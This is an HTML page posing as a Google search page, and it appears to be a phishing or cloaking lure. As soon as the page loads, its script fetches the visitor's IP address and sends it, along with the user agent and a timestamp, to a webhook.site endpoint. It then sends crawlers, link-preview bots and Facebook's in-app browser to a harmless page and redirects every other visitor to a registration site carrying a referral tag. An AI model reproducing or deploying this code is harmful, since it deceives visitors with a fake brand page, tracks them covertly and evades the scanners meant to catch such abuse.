
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Google</title>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 20%; }
    input[type="text"] { width: 300px; padding: 10px; }
  </style>
  <script>
    const ua = navigator.userAgent;
    const ipURL = "https://api.ipify.org?format=json";

    fetch(ipURL).then(res => res.json()).then(data => {
      const log = {
        ip: data.ip,
        ua: ua,
        ts: new Date().toISOString()
      };
      fetch("https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(log)
      });
    });

    setTimeout(() => {
      const isBot = /bot|crawl|preview|line|twitter|facebook/i.test(ua.toLowerCase());
      const isFbBrowser = ua.toLowerCase().includes("fbav") || ua.toLowerCase().includes("fban");
      if (isBot || isFbBrowser) {
        window.location.href = "https://redirect.to/bot-safe-page";
      } else {
        window.location.href = "https://sweetheng.com/register?partner_ref=ttkk";
      }
    }, 300);
  </script>
</head>
<body>
  <h1>Google</h1>
  <input type="text" placeholder="Search Google or type a URL" />
</body>
</html>
